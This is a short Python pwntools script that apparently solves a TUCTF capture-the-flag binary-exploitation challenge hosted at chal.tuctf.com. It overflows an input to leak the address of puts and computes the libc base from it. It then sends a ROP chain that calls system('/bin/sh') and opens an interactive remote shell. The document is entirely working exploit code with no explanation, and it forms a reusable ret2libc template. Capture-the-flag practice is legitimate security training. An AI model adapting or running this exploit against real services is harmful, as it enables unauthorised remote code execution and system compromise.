from pwn import *

#r = process("./leak")
r = remote("chal.tuctf.com", 30505)
elf = context.binary = ELF("./leak")
rop = ROP(elf)
libc = ELF("libc.so.6")

context.terminal = ["tmux", "splitw", "-v"]
#gdb.attach(r)

r.recv()
r.sendline("A" * 31)

resp = r.recv()
puts_leak = resp[resp.find("A\n") + len("A\n"):resp.find("?")].strip().ljust(8, "\x00")
puts_leak = struct.unpack("Q", puts_leak)[0]
log.info("puts leak: {}".format(hex(puts_leak)))

libc.address = puts_leak - libc.symbols["puts"]
log.info("libc address: {}".format(hex(libc.address)))

rop = ROP(libc)
rop.system(next(libc.search("/bin/sh\x00")))

payload = ""
payload += "A" * 44
payload += str(rop)

r.sendline(payload)
r.sendline()

r.interactive()
